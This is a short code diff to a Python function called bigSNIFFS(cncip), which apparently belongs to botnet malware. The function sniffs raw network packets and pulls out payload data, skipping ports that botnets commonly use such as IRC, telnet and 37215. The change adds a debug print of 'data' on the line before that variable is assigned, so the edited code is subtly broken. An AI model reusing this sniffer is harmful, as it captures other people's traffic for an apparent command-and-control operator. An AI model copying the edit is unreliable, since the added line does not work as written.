@@ -120,6 +120,7 @@ def bigSNIFFS(cncip):
             tcph_len = resrve >> 4
             h_size = iph_length+tcph_len*4
             data_size = len(packet)-h_size
+            print(data)
             data = packet[h_size:]
             if len(data) > 2 and source_port!=1337 and source_port!=6667 and source_port!=23 and source_port!=443 and source_port!=37215 and source_port!=53 and source_port!=22 and dest_port!=1337 and dest_port!=6667 and dest_port!=23 and dest_port!=443 and dest_port!=37215 and dest_port!=53 and dest_port!=22:
                 try:
